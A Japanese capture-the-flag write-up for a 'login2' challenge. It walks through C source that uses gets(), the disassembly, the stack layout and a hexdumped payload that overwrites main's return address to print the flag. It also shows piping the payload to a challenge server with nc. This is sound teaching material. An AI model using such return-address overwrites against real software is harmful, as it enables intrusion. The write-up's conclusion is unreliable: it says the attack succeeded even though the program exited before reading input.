# login2
## ソースコード
```c
//  gcc login2.c -o login2 -fno-stack-protector -no-pie -fcf-protection=none
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
char flag[0x20];
char *gets(char *s);
void setup()
{
    FILE *f = NULL;
    alarm(60);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    f = fopen("flag.txt", "rt");
    if (f == NULL) {
        printf("Failed to read flag.txt\n");
        exit(0);
    }
    fscanf(f, "%s", flag);
    fclose(f);
}
int main()
{
    char id[0x20] = "";
    char password[0x20] = "";
    setup();
    printf("ID: ");
    gets(id);
    printf("Password: ");
    gets(password);
    if (strcmp(id, "admin") == 0 &&
        strcmp(password, flag) == 0) {
        printf("Login Succeeded\n");
        printf("The flag is: %s\n", flag);
    } else
        printf("Invalid ID or password\n");
}
```
## 関数のリターンアドレスについて
<!-- todo -->
```assembly
00000000004011b6 <setup>:
4011b6: 55 push rbp
4011b7: 48 89 e5 mov rbp,rsp
:
401284: e8 c7 fd ff ff call 401050 <fclose@plt>
401289: 90 nop
40128a: c9 leave
40128b: c3 ret
:
000000000040128c <main>:
:
4012d4: b8 00 00 00 00 mov eax,0x0
4012d9: e8 d8 fe ff ff call 4011b6 <setup>
4012de: 48 8d 3d 46 0d 00 00 lea rdi,[rip+0xd46] # 40202b <_...
```
以上は、setup関数の先頭と末尾、main関数のsetup関数を呼び出している部分。  
アドレス0x4012d9の```call 4011b6```で処理が0x4011b6に移り、0x40128bのret命令で処理が0x4012deに戻る。  
このとき、ret命令が実行された後に戻るアドレスはスタックに保存されている。  
そのアドレスを関数のリターンアドレスという。


## 攻略
今回の目的は、ソースコード44行目の```printf("The flag is: %s\n", flag);```を実行させること。  
main関数からの戻り先のアドレスを変更することで実現する。

### まず、処理を飛ばす先のアドレスを探す
main関数実行時のスタックの状態
|アドレス|サイズ|内容|
|:---|:---|:---|
|rdp-0x40|0x20|password|
|rdp-0x20|0x20|id|
|rdp|0x08|古いrdpの値|
|rdp+0x8|0x08|main関数から__libc_start_main関数へのアドレス|


「main関数から__libc_start_main関数へのアドレス」を```printf("The flag is: %s\n", flag);```が実行されるアドレスに変更してフラグを得る。  
そのアドレスを探すために以下を実行する。
```
objdump -d -M intel login2 > login2.txt
cat login2.txt
```
main関数の部分を抜き出してみてみる。
```assembly
000000000040128c <main>:
  40128c:       55                      push   rbp
  40128d:       48 89 e5                mov    rbp,rsp
  401290:       48 83 ec 40             sub    rsp,0x40
  401294:       48 c7 45 e0 00 00 00    mov    QWORD PTR [rbp-0x20],0x0
  40129b:       00
  40129c:       48 c7 45 e8 00 00 00    mov    QWORD PTR [rbp-0x18],0x0
  4012a3:       00
  4012a4:       48 c7 45 f0 00 00 00    mov    QWORD PTR [rbp-0x10],0x0
  4012ab:       00
  4012ac:       48 c7 45 f8 00 00 00    mov    QWORD PTR [rbp-0x8],0x0
  4012b3:       00
  4012b4:       48 c7 45 c0 00 00 00    mov    QWORD PTR [rbp-0x40],0x0
  4012bb:       00
  4012bc:       48 c7 45 c8 00 00 00    mov    QWORD PTR [rbp-0x38],0x0
  4012c3:       00
  4012c4:       48 c7 45 d0 00 00 00    mov    QWORD PTR [rbp-0x30],0x0
  4012cb:       00
  4012cc:       48 c7 45 d8 00 00 00    mov    QWORD PTR [rbp-0x28],0x0
  4012d3:       00
  4012d4:       b8 00 00 00 00          mov    eax,0x0
  4012d9:       e8 d8 fe ff ff          call   4011b6 <setup>
  4012de:       48 8d 3d 46 0d 00 00    lea    rdi,[rip+0xd46]        # 40202b <_IO_stdin_used+0x2b>
  4012e5:       b8 00 00 00 00          mov    eax,0x0
  4012ea:       e8 71 fd ff ff          call   401060 <printf@plt>
  4012ef:       48 8d 45 e0             lea    rax,[rbp-0x20]
  4012f3:       48 89 c7                mov    rdi,rax
  4012f6:       e8 95 fd ff ff          call   401090 <gets@plt>
  4012fb:       48 8d 3d 2e 0d 00 00    lea    rdi,[rip+0xd2e]        # 402030 <_IO_stdin_used+0x30>
  401302:       b8 00 00 00 00          mov    eax,0x0
  401307:       e8 54 fd ff ff          call   401060 <printf@plt>
  40130c:       48 8d 45 c0             lea    rax,[rbp-0x40]
  401310:       48 89 c7                mov    rdi,rax
  401313:       e8 78 fd ff ff          call   401090 <gets@plt>
  401318:       48 8d 45 e0             lea    rax,[rbp-0x20]
  40131c:       48 8d 35 18 0d 00 00    lea    rsi,[rip+0xd18]        # 40203b <_IO_stdin_used+0x3b>
  401323:       48 89 c7                mov    rdi,rax
  401326:       e8 55 fd ff ff          call   401080 <strcmp@plt>
  40132b:       85 c0                   test   eax,eax
  40132d:       75 3d                   jne    40136c <main+0xe0>
  40132f:       48 8d 45 c0             lea    rax,[rbp-0x40]
  401333:       48 8d 35 86 2d 00 00    lea    rsi,[rip+0x2d86]        # 4040c0 <flag>
  40133a:       48 89 c7                mov    rdi,rax
  40133d:       e8 3e fd ff ff          call   401080 <strcmp@plt>
  401342:       85 c0                   test   eax,eax
  401344:       75 26                   jne    40136c <main+0xe0>
  401346:       48 8d 3d f4 0c 00 00    lea    rdi,[rip+0xcf4]        # 402041 <_IO_stdin_used+0x41>
  40134d:       e8 ee fc ff ff          call   401040 <puts@plt>
  401352:       48 8d 35 67 2d 00 00    lea    rsi,[rip+0x2d67]        # 4040c0 <flag>
  401359:       48 8d 3d f1 0c 00 00    lea    rdi,[rip+0xcf1]        # 402051 <_IO_stdin_used+0x51>
  401360:       b8 00 00 00 00          mov    eax,0x0
  401365:       e8 f6 fc ff ff          call   401060 <printf@plt>
  40136a:       eb 0c                   jmp    401378 <main+0xec>
  40136c:       48 8d 3d ef 0c 00 00    lea    rdi,[rip+0xcef]        # 402062 <_IO_stdin_used+0x62>
  401373:       e8 c8 fc ff ff          call   401040 <puts@plt>
  401378:       b8 00 00 00 00          mov    eax,0x0
  40137d:       c9                      leave
  40137e:       c3                      ret
  40137f:       90                      nop
```
<printf@plt>や<gets@plt>など、Cの関数と思われるものが呼び出されている場所があるので、これを利用してソースコード44行目のアドレスを特定する。  

```assembly
  4012d9:       e8 d8 fe ff ff          call   4011b6 <setup>
  4012de:       48 8d 3d 46 0d 00 00    lea    rdi,[rip+0xd46]        # 40202b <_IO_stdin_used+0x2b>
  4012e5:       b8 00 00 00 00          mov    eax,0x0
  4012ea:       e8 71 fd ff ff          call   401060 <printf@plt>
  4012ef:       48 8d 45 e0             lea    rax,[rbp-0x20]
  4012f3:       48 89 c7                mov    rdi,rax
  4012f6:       e8 95 fd ff ff          call   401090 <gets@plt>
  4012fb:       48 8d 3d 2e 0d 00 00    lea    rdi,[rip+0xd2e]        # 402030 <_IO_stdin_used+0x30>
  401302:       b8 00 00 00 00          mov    eax,0x0
  401307:       e8 54 fd ff ff          call   401060 <printf@plt>
  40130c:       48 8d 45 c0             lea    rax,[rbp-0x40]
  401310:       48 89 c7                mov    rdi,rax
  401313:       e8 78 fd ff ff          call   401090 <gets@plt>
  401318:       48 8d 45 e0             lea    rax,[rbp-0x20]
  40131c:       48 8d 35 18 0d 00 00    lea    rsi,[rip+0xd18]        # 40203b <_IO_stdin_used+0x3b>
  401323:       48 89 c7                mov    rdi,rax
  401326:       e8 55 fd ff ff          call   401080 <strcmp@plt>
  40132b:       85 c0                   test   eax,eax
  40132d:       75 3d                   jne    40136c <main+0xe0>
  ```
  以上の部分を見ると、setup関数、printf関数、...と呼び出されており、ソースコード中の関数呼び出しが行われていることが分かる。
  ```c
      setup();
    printf("ID: ");
    gets(id);
    printf("Password: ");
    gets(password);
```
次にstrcmp関数が呼び出され、jne命令でどこかにジャンプしている。
```assembly
  401326:       e8 55 fd ff ff          call   401080 <strcmp@plt>
  40132b:       85 c0                   test   eax,eax
  40132d:       75 3d                   jne    40136c <main+0xe0>
```
これを追ってみる。
```assembly
  401344:       75 26                   jne    40136c <main+0xe0>
  
  40136c:       48 8d 3d ef 0c 00 00    lea    rdi,[rip+0xcef]        # 402062 <_IO_stdin_used+0x62>
  401373:       e8 c8 fc ff ff          call   401040 <puts@plt>
  401378:       b8 00 00 00 00          mov    eax,0x0
  40137d:       c9                      leave
  40137e:       c3                      ret
  40137f:       90                      nop
```
すると、puts関数を使用してmain関数が終了していることが分かる。これは、ソースコードを見ると、
```c
    if (strcmp(id, "admin") == 0 &&
        strcmp(password, flag) == 0) {
        printf("Login Succeeded\n");
        printf("The flag is: %s\n", flag);
    } else
        printf("Invalid ID or password\n");
```
このelse文に相当することが分かる。(printf関数ではなくputs関数が呼び出されているのはコンパイラによる最適化によるものだと思われる。)  
よって、ひとまずジャンプした先には目的のものはないので、ジャンプしなかった場合の実行を追っていく。
```assembly
  40132d:       75 3d                   jne    40136c <main+0xe0>
  
  40132f:       48 8d 45 c0             lea    rax,[rbp-0x40]
  401333:       48 8d 35 86 2d 00 00    lea    rsi,[rip+0x2d86]        # 4040c0 <flag>
  40133a:       48 89 c7                mov    rdi,rax
  40133d:       e8 3e fd ff ff          call   401080 <strcmp@plt>
  401342:       85 c0                   test   eax,eax
  401344:       75 26                   jne    40136c <main+0xe0>  # 行き先が先ほど見たelse文の場所と同じなのでスルー
  
  401346:       48 8d 3d f4 0c 00 00    lea    rdi,[rip+0xcf4]        # 402041 <_IO_stdin_used+0x41>
  40134d:       e8 ee fc ff ff          call   401040 <puts@plt>
  401352:       48 8d 35 67 2d 00 00    lea    rsi,[rip+0x2d67]        # 4040c0 <flag>
  401359:       48 8d 3d f1 0c 00 00    lea    rdi,[rip+0xcf1]        # 402051 <_IO_stdin_used+0x51>
  401360:       b8 00 00 00 00          mov    eax,0x0
  401365:       e8 f6 fc ff ff          call   401060 <printf@plt>
  40136a:       eb 0c                   jmp    401378 <main+0xec>
```
再度strcmp関数が呼び出され、ジャンプ命令があるが、行き先は先ほど見たelse文の場所と同じなのでスルー。  
その後のアドレス0x401346から処理を追うと、puts関数、printf関数が順に呼び出されていることが分かる。(puts関数になっているのは先ほどと同じ理由)  
今回実行させたいのは二番目のprintfの部分。よってアドレス0x401352をメモしておく。  
ここで、メモをするのがアドレス0x401365でないのは、関数の引数の設定を行っている部分も含む必要があるため。puts関数の実行の次の行からprintf関数の実行の前までの文がそれを行っている。  
飛ばしたいアドレスが分かったので、スタックバッファオーバーフローにより、そのアドレスの命令を実行させる。

### スタックバッファオーバーフロー
バイナリエディタを使って、以下のファイルを作成する。
```
clpwn@CLPWN:~$ hexdump -Cv attack.bin
00000000  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  |aaaaaaaaaaaaaaaa|
00000010  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  |aaaaaaaaaaaaaaaa|
00000020  61 61 61 61 61 61 61 61  52 13 40 00 00 00 00 00  |aaaaaaaaR.@.....|
00000030
```
main関数実行時のスタックの構造が以下の通りであったので、password、id、古いrdpの値は適当な値で埋め、main関数から__libc_start_main関数へのアドレスが保存されているアドレスに、処理を飛ばしたいアドレスを入れる。リトルエンディアンに注意する。

|アドレス|サイズ|内容|
|:---|:---|:---|
|rdp-0x40|0x20|password|
|rdp-0x20|0x20|id|
|rdp|0x08|古いrdpの値|
|rdp+0x8|0x08|main関数から__libc_start_main関数へのアドレス|
  
作成したattack.binを入力として、login2を実行してみる。  
```
clpwn@CLPWN:~$ cat attack.bin | ./login2
Failed to read flag.txt
```
今回は手元の環境で実行し、flag.txtファイルは存在しないためエラーが出力されたが、flag.txtを読み取る処理は実行されているため、攻撃は成功している。  
実際のCTFなどでは、```cat attack.bin | nc localhost 10002```などとして、入力を問題サーバーに送ることでflagを得ることができる。
